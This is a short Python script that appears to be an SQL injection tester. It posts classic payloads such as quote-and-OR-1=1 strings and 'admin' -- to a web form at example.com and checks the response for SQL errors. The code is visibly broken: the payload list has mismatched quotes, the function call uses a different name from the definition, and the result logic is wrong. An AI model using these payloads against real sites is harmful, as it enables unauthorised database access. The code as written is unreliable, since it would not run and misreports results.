# import necessary libraries
import requests
import re

# function to perform sql injection
def test_sqli(payload):
  # loop through the payloads
  for name in payload:
    # set url to the url containing form
    url = 'http://www.example.com/form'

    # set post data
    data = {
      'name':name
    }

    # initiate the request, and submit data
    response = requests.post(url,data)
    text_response = response.text
    # search for any errors
    if re.search('SQL Error', text_response):
      # check if SQL injection string is present
      if name in text_response:
        print("SQL injection successful.")
        return
    else:
      print("No SQL injection detected.")

# declare sql injection payloads
sql_injection_payload = ['", 1=1 --',' ' OR '1' = "1" --','admin' --','admin ' OR '1' = "1"]

# calling the injection_test function
test_sql(sql_injection_payload)
